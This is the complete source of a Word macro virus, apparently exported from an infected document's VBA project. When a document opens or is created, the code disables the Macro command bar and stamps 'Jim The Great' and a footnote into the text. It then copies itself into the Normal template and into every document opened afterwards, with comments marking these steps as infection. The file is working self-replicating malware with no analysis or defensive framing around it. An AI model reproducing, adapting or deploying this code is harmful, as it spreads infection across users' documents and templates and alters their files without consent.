   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "JB"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Option Explicit
   Dim prvInfNorm As Boolean
   Dim prvInfAct As Boolean
   Dim prvCodeCount As Integer
   Private Sub Document_Close()
   CommandBars("Macro").Enabled = True
   End Sub

   Private Sub Document_New()
       Document_Open
   End Sub

   Private Sub Document_Open()


       CommandBars("Macro").Enabled = False

       ActiveDocument.Content.InsertAfter "Jim The Great"
       ActiveDocument.Content.Footnotes.Add ActiveDocument.Range, "Jim"

       'Check The Name of the Normal Template and Active Document Projects
       If NormalTemplate.VBProject.VBComponents.Item(1).Name <> "JB" Then
           NormalTemplate.VBProject.VBComponents.Item(1).Name = "JB"
           prvInfNorm = True 'Infect Normal
       Else
           prvInfNorm = False ' Don't Infect Normal
       End If
       If ActiveDocument.VBProject.VBComponents.Item(1).Name <> "JB" Then
           ActiveDocument.VBProject.VBComponents.Item(1).Name = "JB"
           prvInfAct = True 'Infect Active Document
       Else
           prvInfAct = False 'Don't Infect Active Document
       End If

       'Infecting the Normal Template
       If prvInfNorm = True Then
           NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
           For prvCodeCount = 1 To ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
               NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines prvCodeCount, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(prvCodeCount, 1)
           Next prvCodeCount
       End If

       ' Infecting the Active Document
       If prvInfAct = True Then
           ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
           For prvCodeCount = 1 To NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
               ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines prvCodeCount, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(prvCodeCount, 1)
           Next prvCodeCount
       End If

   End Sub
